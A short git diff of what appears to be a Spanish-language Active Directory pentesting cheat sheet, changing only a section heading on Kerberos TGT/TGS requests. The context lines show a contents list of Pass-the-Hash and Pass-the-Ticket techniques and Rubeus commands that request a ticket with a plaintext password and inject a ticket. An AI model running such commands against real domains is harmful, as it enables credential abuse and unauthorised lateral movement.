@@ -8,7 +8,7 @@
   - *[Pass-the-Hash](#Pass-the-Hash)*
   - *[Over-Pass-the-Hash](#Over-Pass-the-Hash)*
   - *[Pass-the-ticket](#Pass-the-Ticket)*
-  - [ASK-TGT/TGSt](#ASK_TGT_TGS)
+  - [Creación de ASK-TGT/TGS](#ASK_TGT_TGS)
 
 # Enumeración
 ### Listar usuarios locales:
@@ -111,7 +111,7 @@ C:\AD\Tools\Rubeus.exe asktgt /user:cs.org\juan /password:Colombia.2023. /dc:192
 C:\AD\Tools\Rubeus.exe ptt /ticket:doIFDjCCBQqgAw...
 ```
 
-## ASK-TGT/TGS
+## Creación de ASK-TGT/TGS
 
 Se genera tráfico legítimo Kerberos para solicitar: AS-REQ TGS-REQ. ¡No necesita ser administrador!
 Para solicitar el TGT concociendo el *Hash* del usuario: 
